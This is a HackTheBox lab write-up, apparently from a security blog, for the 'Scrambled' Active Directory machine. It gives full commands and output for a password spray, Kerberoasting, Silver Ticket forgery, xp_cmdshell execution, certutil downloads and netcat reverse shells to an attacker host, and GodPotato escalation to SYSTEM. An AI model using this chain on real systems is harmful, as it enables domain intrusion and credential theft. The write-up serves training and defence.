---
title: "Scrambled"
date: 2022-10-01 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [Weak-Password, Username-Disclosure, Kerberoasting, Silver-Ticket, Xp-CmdShell, SeImpersonate-Privilege]
description: Writeup for HackTheBox Scrambled machine
image:
  path: assets/img/scrambled/scrambled.png
  alt: HTB Scrambled
---


## Executive Summary

Scrambled is a medium-difficulty Windows Active Directory machine on HackTheBox. NTLM authentication is disabled domain-wide, forcing all attack paths through Kerberos. The attack chain exploits a weak password policy discovered via web enumeration, Kerberoasting of a service account, and a Silver Ticket attack to gain SQL Server access.

Web enumeration of the internal intranet reveals a password reset policy that sets passwords equal to usernames. The IT support page leaks the username `ksimpson`. LDAP null-session enumeration returns fifteen domain accounts. A password spray confirms `ksimpson:ksimpson` as valid credentials.

With a Kerberos TGT for `ksimpson`, `GetUserSPNs.py` identifies `sqlsvc` as the only Kerberoastable account (SPN: `MSSQLSvc/DC1.scrm.local:1433`). The RC4-encrypted TGS ticket is cracked offline to recover the password `Pegasus60`. The NT hash of `Pegasus60` is computed and used with the domain SID to forge a **Silver Ticket** impersonating Administrator against the SQL Server. `mssqlclient.py` connects with this forged ticket and `xp_cmdshell` is enabled, providing OS command execution and a reverse shell as `sqlsvc`.

Inside the `ScrambleHR` database, the `UserImport` table contains plaintext credentials for `MiscSvc:ScrambledEggs9900`. PowerShell remoting is used to execute commands as `MiscSvc`, retrieving the user flag. The `sqlsvc` shell holds `SeImpersonatePrivilege`, which GodPotato exploits via DCOM/RPC token impersonation to escalate to `nt authority\system`.

---

## Reconnaissance

### Nmap Scan

A two-phase Nmap scan identifies open ports and enumerates service versions.

```bash
kali@kali$ nmap -sS -Pn -min-rate 5000 --max-retries 1 -T4 -p- 10.129.118.40
Starting Nmap 7.99 at 2026-07-18 05:09 +0000
Nmap scan report for 10.129.118.40
Host is up (0.35s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  found
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49698/tcp open  unknown
49708/tcp open  unknown
56832/tcp open  unknown
Nmap done: 1 IP address (1 host up) scanned in 28.61 seconds
```

```bash
kali@kali$ nmap -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49698,49708,56832 10.129.118.40
Starting Nmap 7.99 at 2026-07-18 05:11 +0000
Nmap scan report for 10.129.118.40
Host is up (0.36s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-18 05:17:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-07-18T05:20:46+00:00; +5m40s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-07-18T05:20:45+00:00; +5m39s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.118.40:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-18T04:58:09
|_Not valid after:  2056-07-18T04:58:09
|_ssl-date: 2026-07-18T05:20:46+00:00; +5m40s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-18T05:20:46+00:00; +5m40s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2026-07-18T05:20:45+00:00; +5m39s from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
56832/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 5m39s, deviation: 0s, median: 5m39s
| smb2-time:
|   date: 2026-07-18T05:20:08
|_  start_date: N/A
```

The port profile confirms a Windows Active Directory Domain Controller. Several services warrant immediate attention:

- **Port 53 / 88 / 389 / 636 / 3268 / 3269 (DNS, Kerberos, LDAP):** Standard DC fingerprint. The LDAP certificate SAN discloses the DC hostname `DC1.scrm.local` and domain `scrm.local`.
- **Port 80 (HTTP, IIS 10.0):** An intranet labelled "Scramble Corp Intranet" — a web application on an internal corporate server often exposes documentation, policy pages, or usernames that are not intended to be public.
- **Port 445 (SMB):** SMB signing is enabled and required. NTLM relay attacks against this host are not viable.
- **Port 1433 (MSSQL, SQL Server 2019 RTM):** A SQL Server instance is directly accessible. The RTM (Release To Manufacturing) build with no post-SP patches applied indicates the instance has not been updated.
- **Port 4411 (custom service):** The banner `SCRAMBLECORP_ORDERS_V1.0.3` identifies a custom orders application. Unknown services built in-house are often worth revisiting after more context is gathered.
- **Port 5985 (WinRM):** PowerShell remoting is enabled.
- **Port 9389 (ADWS):** Active Directory Web Services, used by BloodHound and the PowerShell AD module for LDAP queries.

Add the hostname to the local resolver:

```bash
kali@kali$ echo "10.129.118.40 scrm.local DC1.scrm.local DC1" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Website Discovery

Visiting port 80 presents the Scramble Corp intranet — an internal portal for employees. The site is publicly accessible without authentication.

<img src="assets/img/scrambled/Website_initial_page.png" alt="The Scramble Corp intranet homepage on port 80. The site includes navigation links to Reports, IT Services, and other internal pages. The public accessibility of an internal portal without authentication is itself a misconfiguration, as the pages below contain sensitive operational information.">

### Password Reset Policy

The `/passwords.html` page contains the following notice:

> "Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username."

<img src="assets/img/scrambled/Password_reset.png" alt="The /passwords.html page on the Scramble Corp intranet showing the password reset policy. The text explicitly states that user passwords are reset to match usernames when the helpdesk is unavailable — a critical information disclosure that makes the entire domain trivially susceptible to a password spray with username-as-password pairs.">

This is the critical finding for the initial foothold: any account that has undergone a password reset via this process will have its password set to its username. This creates a reliable password spray candidate for all domain users.

### IT Support Page and Username Disclosure

The `/supportrequest.html` page contains an example `ipconfig` output showing `C:\Users\ksimpson>` as the command prompt — directly leaking the username `ksimpson` as a real domain account.

<img src="assets/img/scrambled/Contacting_IT_support_reveal_username.png" alt="The IT support request page on the intranet. An example troubleshooting transcript shows a Windows command prompt with C:\Users\ksimpson>, inadvertently disclosing ksimpson as a valid domain username. This is the first confirmed account for use in the password spray.">

### New User Page

<img src="assets/img/scrambled/Newuser_subdomain_reveal.png" alt="The new user account request form on the intranet. The Manager field dropdown may reveal existing domain usernames, providing additional account enumeration via the web interface.">

---

## SMB Enumeration

A guest SMB session is tested before attempting authenticated access:

```bash
kali@kali$ nxc smb DC1.scrm.local -u 'guest' -p '' --shares
```

```
SMB         DC1.scrm.local  445    DC1              [*] Windows Server 2019 Build 17763 x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\guest:
SMB         DC1.scrm.local  445    DC1              [*] Enumerated shares
SMB         DC1.scrm.local  445    DC1              Share           Permissions    Remark
SMB         DC1.scrm.local  445    DC1              -----           -----------    ------
SMB         DC1.scrm.local  445    DC1              ADMIN$                         Remote Admin
SMB         DC1.scrm.local  445    DC1              C$                             Default share
SMB         DC1.scrm.local  445    DC1              IPC$            READ           Remote IPC
SMB         DC1.scrm.local  445    DC1              NETLOGON                       Logon server share
SMB         DC1.scrm.local  445    DC1              Public          READ
SMB         DC1.scrm.local  445    DC1              SYSVOL                         Logon server share
```

`Null Auth:True` confirms null sessions are accepted. No sensitive shares are writable as guest — the `Public` share is readable but not the attack path here. The notable detail is `NTLM:False` is not shown explicitly, but tools that attempt NTLM authentication later will fail, confirming NTLM is disabled domain-wide. All further enumeration and exploitation must proceed via Kerberos.

---

## Initial Foothold — LDAP Enumeration and Password Spray

### LDAP User Enumeration

NTLM is disabled, but LDAP null sessions are still accepted. `nxc ldap` with an empty username and password enumerates all domain users:

```bash
kali@kali$ nxc ldap DC1.scrm.local -u '' -p '' --users
```

```
LDAP        DC1.scrm.local  389    DC1              [*] None (name:DC1) (domain:scrm.local) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1.scrm.local  389    DC1              [+]
LDAP        DC1.scrm.local  389    DC1              [*] Enumerated 15 domain users: scrm.local
LDAP        DC1.scrm.local  389    DC1              -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        DC1.scrm.local  389    DC1              administrator                 2021-11-08 00:35:59 0        Built-in account for administering the computer/domain
LDAP        DC1.scrm.local  389    DC1              Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        DC1.scrm.local  389    DC1              krbtgt                        2020-01-26 19:15:47 0        Key Distribution Center Service Account
LDAP        DC1.scrm.local  389    DC1              tstar                         2021-11-05 14:55:51 0
LDAP        DC1.scrm.local  389    DC1              asmith                        2020-02-08 22:29:01 0
LDAP        DC1.scrm.local  389    DC1              sjenkins                      2020-02-08 23:11:26 0
LDAP        DC1.scrm.local  389    DC1              sdonington                    2020-02-08 23:11:54 0
LDAP        DC1.scrm.local  389    DC1              backupsvc                     2021-10-31 20:49:04 0        Backup system service
LDAP        DC1.scrm.local  389    DC1              jhall                         2021-10-31 21:09:23 0
LDAP        DC1.scrm.local  389    DC1              rsmith                        2021-10-31 21:09:54 0
LDAP        DC1.scrm.local  389    DC1              ehooker                       2021-11-03 19:02:41 0
LDAP        DC1.scrm.local  389    DC1              khicks                        2021-11-01 15:36:08 0
LDAP        DC1.scrm.local  389    DC1              sqlsvc                        2021-11-03 16:32:02 0        SQL server
LDAP        DC1.scrm.local  389    DC1              miscsvc                       2021-11-03 18:07:47 0        Miscellaneous scheduled tasks and services
LDAP        DC1.scrm.local  389    DC1              ksimpson                      2021-11-04 00:30:57 0
```

<img src="assets/img/scrambled/All_user_enemurated.png" alt="LDAP enumeration output showing all 15 domain accounts in scrm.local. Service accounts sqlsvc (description: SQL server) and miscsvc (description: Miscellaneous scheduled tasks and services) are immediately identifiable by their descriptions and naming convention. backupsvc is also a service account. ksimpson appears as a recently created regular user account, and is the account confirmed via the IT support page.">

The enumeration yields two critical findings: `sqlsvc` and `miscsvc` are service accounts, identified by description and the `svc` suffix. Service accounts with SPNs are Kerberoasting targets. `ksimpson` is present and its recent password-set timestamp suggests it may have been through the password reset process described on the intranet.

### Password Spray

All domain usernames are extracted into a wordlist and sprayed with the same username as password — exploiting the password reset policy:

```bash
kali@kali$ nxc smb DC1.scrm.local -u users.txt -p users.txt --continue-on-success
```

```
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson
```

`ksimpson:ksimpson` is confirmed as a valid credential pair.

---

## Kerberoasting svc_mssql

### Obtaining a TGT for ksimpson

Because NTLM is disabled, all authentication must use Kerberos. A TGT is obtained for `ksimpson` and loaded into the credential cache:

```bash
kali@kali$ python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip DC1.scrm.local scrm.local/ksimpson:ksimpson
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ksimpson.ccache
```

```bash
kali@kali$ export KRB5CCNAME=ksimpson.ccache
```

### Kerberoasting sqlsvc

Any authenticated domain user can request a **Ticket Granting Service (TGS)** ticket for any account with a registered **Service Principal Name (SPN)**. The TGS ticket is encrypted with the service account's NT hash as the key. An attacker who obtains this ticket can attempt offline dictionary attacks against the encrypted blob to recover the plaintext password — without alerting the Domain Controller, as TGS requests are routine and voluminous in any AD environment.

`GetUserSPNs.py` with `-k` uses the existing Kerberos credential cache to authenticate and request tickets for all SPN-bearing accounts:

```bash
kali@kali$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-host DC1.scrm.local scrm.local/ksimpson:ksimpson -k -no-pass -target-domain scrm.local -request
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/DC1.scrm.local:1433  sqlsvc            2021-11-03 16:32:02.351452  2026-07-18 04:58:07.469873
MSSQLSvc/DC1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2026-07-18 04:58:07.469873

[-] CCache file is not found. Skipping...

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$3ca9f9d52236fc025e50d5c3292a7c93$876e317288ccea40b61e266319211592b40fd75401a757ff04aeacd9795b3b8e501cc2ac1fa5e314102fdc7af3934db423601013a755fe8b7a9afc7e2c6d493df0fbbeb43eef0d7b98170aaf91e4e0f2460809553b1163bc9a0db226f0f2cbada4678481cbcddb8dff85e7e8ffbcae713f88653e328b5b35375c22b64b8e8eb2a51ec3229172bc4e7fb26646fa92786d021be24a3a7dac3209c9caf3d56df358e43da86b23ed162678ff6be30006726dbd571ac800982ad10ab89e16a62e2d2ef18190f7295d5e888c45ee9a2ed228203dae49e00080ae328430af0c8e1c06d8fd71ed22928a3dc75adb0e80845dc180f0b14d7a5b2a7464a0cabab432a9688c146485fc415624c601fc4b4c740b1d05852e6b5d3e014c26be4f5455ace7212f3e70d4e8efa990d62e0c1d3599edf7cfff21978722939adf8cc861d12a0421867b7a832ab166b93af585a3de4034f978c58e384c14ad7a3384fc60c7e0e568340faed41c2435260a4823bbec5472c1c9ab05aea787b759f436c8a617c9e404f245d5379e91b1cef07db4aa304949e34895b0c4c9a6de30fc4b4f03cd6d1a5a2d840ee9bade9f842d54132b8cbd9529d65c5034c3643745acfeaf6e197f0a1057adec9ed22b6d81a75f7eb38227cacd4309e09e8094126a7cfea39fc2b6862c0ca21b6a9bec11382986dbf70ade5a1b0c3d2c4036ec667ef10734f0db70a3ccb11005c6ff32c65bb32c9c9f86ad31b18c3aa510011591a63728838052cbb0b48434e46f2ff692ee0ff73edeb1c45b0339679eb442abd05527d29e8c3e415168f290132dc77c6979b19239e20ec56e2e3e005596da204059a918cf0f10bf7f6f7d36d37d32aff708a49cf856ba37192e6315feb28a39a63d9a7cb18ad6e390f74203fd0bd99a8f1f805faa669d9e78ab3d2529269532c9960d63b3bfcba5ab24e587b98351e3d4e1557f191fc3cdf1c0a5592dd0188ddb506cfce53dfc02e90d300811f9db59a7961985cd20a098258b5505cda566c6f1b8053d9879e50959bca4845a3c00245f09f9fa79fd252dd195d78e90251df1d0e1bab7e6c07053463720d1828567d97273a36b24f656589e51ed5fe7bbad4f3ae746445b05449e86933182fe5c8287e75d27867e0ce3f8687f9fe901cbae5f364fd1dc15fa311e21faed54487eaf004e6408b5aa65b2738df00d259a0935f61052426393e73446fb02c3cc4fc6a2878bb11a50b6a9546ea11c1dab132242b34b816bf892fe1101dc9c9f2ac017eb04757f4e196f491989723780fd17a75457adf3dc123ae8bd1689b38e00939ea62a5dca8da9e1959d41d3035f4cff84ac4f98bed401ca84bc4b7cd04a0a6bc647acd4db2381db68df5cdfbf7bde2fe6a82b3950585caf21d276d163dc23cd940c321ee18c86817cdd2d9ee555886a5eac4817d6f4721ad0
```

The SPN `MSSQLSvc/DC1.scrm.local:1433` confirms SQL Server on port 1433. The ticket uses etype 23 (RC4-HMAC) — an older, faster-to-crack cipher that is often set by default for service accounts registered before AES enforcement was standard.

The ticket is cracked offline with Hashcat mode `13100` (Kerberos 5 TGS-REP, etype 23):

```bash
kali@kali$ hashcat -m 13100 ticket.txt /usr/share/wordlists/rockyou.txt -o cracked.txt --force
hashcat (v7.1.2) starting

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$3ca9f9d5...6f4721ad0
Recovered........: 1/1 (100.00%) Digests (total)
```

```bash
kali@kali$ cat cracked.txt
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$...:Pegasus60
```

The plaintext password for `sqlsvc` is `Pegasus60`.

---

## Silver Ticket Attack — SQL Server Access

### What is a Silver Ticket?

A **Silver Ticket** is a forged Kerberos service ticket created locally, without any interaction with the Domain Controller's KDC. To forge one, an attacker needs the NT hash of the target service account, the domain SID, and the SPN of the target service. The resulting ticket is encrypted with the service account's own key — SQL Server decrypts it locally and trusts the embedded identity without ever presenting the ticket to the KDC for validation. This means the DC never logs a TGS-REQ for the forged access, making Silver Tickets harder to detect than most other authentication-based attacks.

### Computing the NT Hash

The NT hash (MD4 of the UTF-16LE-encoded password) is computed from the cracked plaintext:

```bash
kali@kali$ python3 -c "import hashlib,binascii; print(binascii.hexlify(hashlib.new('md4', 'Pegasus60'.encode('utf-16le')).digest()).decode())"
b999a16500b87d17ec7f2e2a68778f05
```

### Retrieving the Domain SID

The domain SID is required to construct the PAC (Privilege Attribute Certificate) embedded in the forged ticket. It identifies the domain the impersonated user belongs to and is used to associate group memberships with the ticket:

```bash
kali@kali$ nxc smb DC1.scrm.local -u 'ksimpson' -p 'ksimpson' -k --rid-brute | head -5
SMB         DC1.scrm.local  445    DC1              [*] Windows Server 2019 Build 17763 x64 (name:DC1) (domain:scrm.local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC1.scrm.local  445    DC1              [+] scrm.local\ksimpson:ksimpson
SMB         DC1.scrm.local  445    DC1              498: SCRM\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         DC1.scrm.local  445    DC1              500: SCRM\administrator (SidTypeUser)
SMB         DC1.scrm.local  445    DC1              501: SCRM\Guest (SidTypeUser)
```

The domain SID is derived from the Administrator's full SID by stripping the final RID: `S-1-5-21-2743207045-1827831105-2542523200`.

### Forging the Silver Ticket

`ticketer.py` constructs a TGS ticket for the `MSSQLSvc/DC1.scrm.local:1433` SPN, embedding the Administrator identity in the PAC:

```bash
kali@kali$ python3 /usr/share/doc/python3-impacket/examples/ticketer.py -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -user ksimpson -password ksimpson Administrator
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

---

## SQL Server Exploitation

### Connecting as Administrator

The forged credential cache is loaded and `mssqlclient.py` connects using the Silver Ticket via Kerberos:

```bash
kali@kali$ export KRB5CCNAME=Administrator.ccache
kali@kali$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py scrm.local -k -no-pass
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

The session authenticates as `SCRM\administrator` with `dbo` role — confirming the Silver Ticket is accepted. `mssqlclient.py`'s `enable_xp_cmdshell` helper enables the OS command execution stored procedure in two steps:

```sql
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell;
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

OS command execution is confirmed, running as the SQL Server service account:

```sql
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami;
output
----------------
scrm\sqlsvc
```

### Getting a Reverse Shell

A reverse shell is delivered by downloading `nc.exe` and connecting back:

```sql
xp_cmdshell "certutil -urlcache -f http://10.10.14.15:8081/nc.exe C:\ProgramData\nc.exe";
xp_cmdshell "C:\ProgramData\nc.exe 10.10.14.15 4444 -e cmd.exe";
```

```bash
kali@kali$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.118.40] 63961
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
scrm\sqlsvc
```

---

## Database Credential Discovery

With an interactive shell as `sqlsvc`, the SQL Server databases are enumerated from within the `mssqlclient.py` session:

```sql
SQL (SCRM\administrator  dbo@master)> SELECT name FROM master.dbo.sysdatabases;
name
----------
master
tempdb
model
msdb
ScrambleHR
```

The `ScrambleHR` database is non-standard. Switching context and querying its tables:

```sql
SQL (SCRM\administrator  dbo@master)> USE ScrambleHR;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
```

```sql
SQL (SCRM\administrator  dbo@master)> SELECT * FROM UserImport;
LdapUser     LdapPwd                  LdapDomain
---------   ---------------------   --------------
MiscSvc      ScrambledEggs9900       scrm.local
```

The `UserImport` table stores plaintext credentials for `MiscSvc:ScrambledEggs9900`. This account was identified earlier from LDAP enumeration with the description "Miscellaneous scheduled tasks and services" — suggesting it may have broader access on the system.

---

## Lateral Movement — Pivoting to MiscSvc

PowerShell remoting is used to execute commands as `MiscSvc` from the existing `sqlsvc` shell, without needing to obtain an interactive session:

```powershell
$pass = ConvertTo-SecureString "ScrambledEggs9900" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("scrm.local\MiscSvc", $pass)
Invoke-Command -ComputerName dc1.scrm.local -Credential $cred {whoami}
scrm\miscsvc
```

The user flag is read from MiscSvc's desktop:

```powershell
Invoke-Command -ComputerName dc1.scrm.local -Credential $cred {cat C:\Users\miscsvc\Desktop\user.txt}
39d**************************399
```

---

## Privilege Escalation — SeImpersonatePrivilege to SYSTEM

### Privilege Enumeration

```cmd
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` is present and enabled on the `sqlsvc` shell. This privilege is routinely granted to SQL Server service accounts to allow client impersonation for database operations. When held by an attacker-controlled process, it enables token impersonation attacks — the attacker's process creates a named pipe, triggers a SYSTEM-level DCOM/RPC activation to connect to it, then calls `ImpersonateNamedPipeClient` to assume the SYSTEM token.

### GodPotato Exploitation

GodPotato implements this technique. It creates a named pipe with a predictable GUID path, triggers the RPCSS service's COM activation to connect and marshal an object through it, then impersonates the incoming SYSTEM connection to spawn a new process under SYSTEM's security context:

```bash
# Start HTTP server on Kali
kali@kali$ python3 -m http.server 8081
```

```cmd
# Download GodPotato
certutil -urlcache -f http://10.10.14.15:8081/GodPotato.exe C:\ProgramData\GodPotato.exe
```

```bash
# Start listener
kali@kali$ nc -lvnp 4445
```

```cmd
# Execute GodPotato
C:\ProgramData\GodPotato.exe -cmd "cmd /c C:\ProgramData\nc.exe 10.10.14.15 4445 -e cmd.exe"
[*] CombaseModule: 0x140712637104128
[*] DispatchTable: 0x140712639410240
[*] UseProtseqFunction: 0x140712638786768
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\3b67ed26-a8ea-4032-8f2c-35dfb78b1615\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000e402-010c-ffff-fb85-df3258c5f40f
[*] DCOM obj OXID: 0x91eb8685fca254d9
[*] DCOM obj OID: 0x54cac6edf85ba76b
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 912 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3516
```

```bash
kali@kali$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.118.40] 53162
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\> whoami
nt authority\system
```

```cmd
C:\> type C:\Users\Administrator\Desktop\root.txt
b2a2a14701850cd8f953521d670d8a5f
```

---

## Vulnerability Chain Summary

**Step 1 — Weak password reset policy disclosed via intranet:** The `/passwords.html` page explicitly documented that helpdesk password resets set user passwords equal to their usernames. This created a reliable spray target for any account that had undergone a reset.

**Step 2 — Username disclosure via IT support page:** The `/supportrequest.html` page contained a sample Windows prompt showing `C:\Users\ksimpson>`, confirming `ksimpson` as a valid domain account. Combined with LDAP null-session enumeration, a complete user list was obtained.

**Step 3 — Kerberoasting with RC4-encrypted ticket:** `sqlsvc` had two SPNs registered and no AES enforcement. Any domain user can request a TGS ticket for a Kerberoastable account. The RC4-encrypted ticket was cracked offline in seconds against `rockyou.txt`.

**Step 4 — Silver Ticket impersonation of SQL Server Administrator:** With `sqlsvc`'s NT hash and the domain SID, a locally forged Kerberos ticket was created that embedded the Administrator's RID in its PAC. SQL Server validated the ticket against its own account key — no KDC involvement, no authentication log at the DC.

**Step 5 — Plaintext credentials in SQL Server database:** The `ScrambleHR.UserImport` table stored LDAP credentials for `MiscSvc` in cleartext, providing a secondary domain account via SQL query.

**Step 6 — SeImpersonatePrivilege to SYSTEM via GodPotato:** The `sqlsvc` service account held `SeImpersonatePrivilege`. GodPotato exploited this to capture a SYSTEM-level token from a DCOM/RPC activation and spawn a shell as `nt authority\system`.

---

## Mitigations

**Enforce strong, unique password policies and remove the username-as-password reset practice.** The intranet's disclosed reset policy directly enabled the password spray. Password resets must generate and communicate a random temporary credential, not reuse the username. Multi-factor authentication for domain logon removes the value of captured credentials entirely.

